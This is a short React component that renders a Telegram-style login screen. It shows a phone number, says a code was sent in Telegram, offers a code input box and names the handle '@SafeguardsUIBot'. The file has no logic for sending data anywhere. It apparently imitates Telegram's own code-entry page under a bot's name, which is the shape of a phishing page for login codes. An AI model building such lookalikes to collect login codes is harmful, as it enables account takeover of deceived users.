import React from "react";

const AuthScreen = ({ phone }) => {
    return (
        <div className="flex items-center justify-center min-h-screen bg-gray-900">
            <div className="w-96 bg-gray-800 p-6 rounded-2xl text-center shadow-lg border-t-4 border-b-4 border-purple-500">
                {/* Monkey Avatar */}
                <div className="flex justify-center">
                    <span className="text-6xl">🐵</span>
                </div>

                {/* Phone Number */}
                <h2 className="text-xl font-semibold text-white mt-4">
                    {phone}
                    <span className="text-gray-400 cursor-pointer"><a href="/">✏️</a></span>
                </h2>

                {/* Info Text */}
                <p className="text-gray-400 text-sm mt-2">
                    We have sent you a message in Telegram with the code.
                </p>

                {/* Code Input */}
                <div className="mt-4">
                    <label className="block text-left text-gray-400 text-sm mb-1">Code</label>
                    <input
                        type="text"
                        className="w-full p-2 border border-gray-600 bg-gray-700 rounded-lg focus:ring-2 focus:ring-purple-500 focus:outline-none text-white text-center"
                        placeholder="Enter Code"
                    />
                </div>

                {/* Telegram Handle */}
                <p className="text-gray-500 text-sm mt-6">@SafeguardsUIBot</p>
            </div>
        </div>
    );
};

export default AuthScreen;
